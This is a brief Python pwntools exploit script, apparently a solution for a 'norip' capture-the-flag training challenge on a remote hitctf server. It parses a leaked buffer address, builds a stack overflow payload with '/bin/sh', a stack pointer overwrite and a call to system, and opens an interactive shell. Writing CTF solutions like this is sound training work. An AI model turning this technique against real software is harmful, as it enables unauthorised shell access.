from pwn import *

#r=process('./norip')
r=remote("train2024.hitctf.cn",26207)

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]

r.recvline()
s=r.recvline().split(b': ')[1][:-1]
print(s)
buf_addr=int(s,16)
main_esp=buf_addr+0x200
need_esp=buf_addr+0x38
print('need_esp: %x' % need_esp,'res:',hex(need_esp).encode()[-4:])
payload=flat(
    b'/bin/sh\0',
    b'a'*(0x30-8),
    int(hex(need_esp).encode()[-4:],16),
    0,
    0x04011de,
    buf_addr,
    0x4011F2,#system
)

r.sendlineafter(b"input your name plz",payload)

r.interactive()